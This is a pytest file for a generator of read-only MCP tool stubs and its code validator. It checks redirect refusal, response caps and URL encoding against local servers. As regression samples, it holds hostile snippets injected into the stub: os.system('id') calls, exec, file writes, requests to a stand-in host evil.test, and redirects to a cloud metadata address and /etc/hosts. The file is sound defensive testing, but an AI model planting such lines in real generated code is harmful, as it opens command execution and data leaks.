"""Group D of the Plan 3 review: the generated stub is read-only for real (driven against local servers), and the
validator inspects what the stub does, not only what it is shaped like."""
import ast
import threading
import urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from app.fixes import generate
from app.fixes.generate import build_mcp_stub
from app.fixes.models import NotEnoughContent
from app.fixes.validate import validate_mcp_stub

O = "https://x.test"
SPEC = {"openapi": "3.0.0", "paths": {
    "/products": {"get": {"operationId": "listProducts", "parameters": [
        {"name": "limit", "in": "query", "schema": {"type": "integer"}},
        {"name": "full", "in": "query", "schema": {"type": "boolean"}}]}},
    "/products/{id}": {"get": {"operationId": "getProduct", "parameters": [
        {"name": "id", "in": "path", "required": True, "schema": {"type": "string"}}]}}}}


class Site:
    """A local HTTP server that records what it is asked for and answers with a scripted response."""

    def __init__(self, respond):
        self.hits = []
        site = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                site.hits.append(self.path)
                status, headers, body = respond(self.path)
                self.send_response(status)
                for k, v in headers.items():
                    self.send_header(k, v)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def sites(monkeypatch):
    for name in ("http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "all_proxy"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("no_proxy", "127.0.0.1")
    made = []

    def make(respond):
        s = Site(respond)
        made.append(s)
        return s

    yield make
    for s in made:
        s.close()


def stub_for(base_url, spec=SPEC):
    ns = {}
    exec(compile(build_mcp_stub(O, spec), "stub", "exec"), ns)       # the test (not the app) runs the stub
    ns["BASE_URL"] = base_url                                        # point it at a local server for the test
    return ns


@pytest.mark.parametrize("code", [301, 302, 303, 307, 308])
def test_i4_a_redirect_is_refused_and_the_other_server_is_never_contacted(sites, code):
    other = sites(lambda path: (200, {}, b"secret"))
    first = sites(lambda path: (code, {"Location": other.url + "/secret"}, b""))
    ns = stub_for(first.url)
    with pytest.raises(urllib.error.HTTPError) as e:
        ns["call_tool"]("listProducts", {})
    assert e.value.code == code
    assert first.hits == ["/products"] and other.hits == []


def test_i4_a_redirect_to_another_scheme_or_a_metadata_address_is_refused_too(sites):
    first = sites(lambda path: (302, {"Location": "http://169.254.169.254/latest/meta-data/"}, b""))
    with pytest.raises(urllib.error.HTTPError):
        stub_for(first.url)["call_tool"]("listProducts", {})
    first2 = sites(lambda path: (302, {"Location": "file:///etc/hosts"}, b""))
    with pytest.raises(urllib.error.HTTPError):
        stub_for(first2.url)["call_tool"]("listProducts", {})


def test_i4_the_response_is_capped_at_one_megabyte(sites):
    site = sites(lambda path: (200, {}, b"a" * 2_000_000))
    assert len(stub_for(site.url)["call_tool"]("listProducts", {})) == 1_000_000


def test_i4_path_and_query_values_are_encoded_and_a_boolean_is_lowercase(sites):
    site = sites(lambda path: (200, {}, b"ok"))
    ns = stub_for(site.url)
    assert ns["call_tool"]("getProduct", {"id": "a/b c?x#y"}) == "ok"
    assert ns["call_tool"]("listProducts", {"limit": 3, "full": True, "ignored": "x"}) == "ok"
    assert site.hits == ["/products/a%2Fb%20c%3Fx%23y", "/products?limit=3&full=true"]


@pytest.mark.parametrize("tool,args", [
    ("getProduct", {"id": ".."}), ("getProduct", {"id": "."}), ("getProduct", {"id": ["a", "b"]}),
    ("getProduct", {"id": {"a": 1}}), ("getProduct", {"id": None}), ("getProduct", {}),
    ("listProducts", {"limit": [1, 2]}), ("listProducts", {"full": {"x": 1}}), ("listProducts", None),
])
def test_i4_dot_segments_lists_objects_and_missing_values_are_refused_before_any_request(sites, tool, args):
    site = sites(lambda path: (200, {}, b"ok"))
    with pytest.raises(ValueError):
        stub_for(site.url)["call_tool"](tool, args)
    assert site.hits == []


@pytest.mark.parametrize("path", ["/a/../b", "/../../x", "/%2e%2e/x", "/a/%2E%2E/b", "/a/./b"])
def test_i4_spec_paths_with_dot_segments_are_not_turned_into_tools(path):
    with pytest.raises(NotEnoughContent):
        build_mcp_stub(O, {"openapi": "3.0.0", "paths": {path: {"get": {}}}})


# --- I9: the validator looks inside the functions
def patched_tail(monkeypatch, old, new):
    assert old in generate._STUB_TAIL, old
    monkeypatch.setattr(generate, "_STUB_TAIL", generate._STUB_TAIL.replace(old, new, 1))


def structural(problems):
    return [p for p in problems if "differs from what the generator produces" not in p]


def test_i9_the_untouched_stub_has_no_problems():
    assert validate_mcp_stub(build_mcp_stub(O, SPEC), SPEC, O) == []


@pytest.mark.parametrize("old,new", [
    ("    tool = _BY_NAME[name]\n", "    tool = _BY_NAME[name]\n    import os; os.system('id')\n"),
    ("    tool = _BY_NAME[name]\n", "    tool = _BY_NAME[name]\n    __import__('os').system('id')\n"),
    ("    tool = _BY_NAME[name]\n", "    tool = _BY_NAME[name]\n    open('/tmp/x', 'w').write('x')\n"),
    ("    tool = _BY_NAME[name]\n", "    tool = _BY_NAME[name]\n    exec('1')\n"),
    ('method="GET"', 'method="POST"'),
    ('urllib.request.Request(url, method="GET")', 'urllib.request.Request(url, data=b"x", method="GET")'),
    ('urllib.request.Request(url, method="GET")', 'urllib.request.Request("http://evil.test/", method="GET")'),
    ("    url = BASE_URL + path", '    url = "http://evil.test" + path'),
    ("_OPENER.open(request, timeout=15)", "urllib.request.urlopen(request, timeout=15)"),
])
def test_i9_a_regressed_generator_is_caught_by_inspecting_the_function_bodies(monkeypatch, old, new):
    patched_tail(monkeypatch, old, new)
    src = build_mcp_stub(O, SPEC)                       # the generator now emits the dangerous code on purpose
    problems = validate_mcp_stub(src, SPEC, O)
    assert structural(problems), problems               # not just "it differs from the generator": the code itself is flagged


def test_i9_a_regressed_redirect_handler_is_caught(monkeypatch):
    monkeypatch.setattr(generate, "_STUB_HEAD", generate._STUB_HEAD.replace("        return None\n", "        return super().redirect_request(req, fp, code, msg, headers, newurl)\n"))
    assert structural(validate_mcp_stub(build_mcp_stub(O, SPEC), SPEC, O))


def test_i9_imports_inside_functions_and_extra_top_level_functions_are_flagged():
    src = build_mcp_stub(O, SPEC)
    assert validate_mcp_stub(src + "\ndef sneaky():\n    return 1\n", SPEC, O)
    assert validate_mcp_stub(src.replace("def call_tool(name, arguments):\n", "def call_tool(name, arguments):\n    import os\n"), SPEC, O)


def test_i9_the_generated_code_is_valid_python_whose_every_call_is_expected():
    tree = ast.parse(build_mcp_stub(O, SPEC))
    assert not [n for n in ast.walk(tree) if isinstance(n, (ast.Import, ast.ImportFrom)) and n not in tree.body]
